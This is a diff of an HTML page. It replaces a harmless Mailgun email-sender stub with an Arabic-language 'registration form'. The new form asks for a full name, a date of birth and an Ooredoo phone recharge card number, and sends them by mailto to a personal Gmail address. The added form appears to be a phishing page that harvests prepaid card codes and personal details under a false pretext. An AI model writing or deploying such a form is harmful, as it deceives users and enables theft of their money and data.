@@ -1,23 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Mailgun Email Sender</title>
+  <title>نموذج التسجيل</title>
 </head>
 <body>
-  <label for="recipient">Recipient Email:</label>
-  <input type="text" id="recipient" value="example@example.com"><br><br>
-  
-  <button onclick="sendEmail()">Send Email</button>
 
-  <script>
-    function sendEmail() {
-      var recipient = document.getElementById('recipient').value;
-      var subject = 'Hello from Mailgun';
-      var message = 'Hello, this is a test email from Mailgun!';
+  <h2>نموذج التسجيل</h2>
 
-      // Code to send email using Mailgun API goes here
-      // Use fetch or AJAX to make a POST request to Mailgun API
-    }
-  </script>
+  <form action="mailto:wided.mee@gmail.com" method="post" enctype="text/plain">
+    <label for="fullName">الاسم واللقب:</label><br>
+    <input type="text" id="fullName" name="fullName"><br><br>
+    
+    <label for="dob">تاريخ الولادة:</label><br>
+    <input type="text" id="dob" name="dob"><br><br>
+    
+    <label for="ooredooCard">بطاقة شحن Ooredoo:</label><br>
+    <input type="text" id="ooredooCard" name="ooredooCard"><br><br>
+    
+    <input type="submit" value="إرسال">
+  </form>
+
 </body>
 </html>
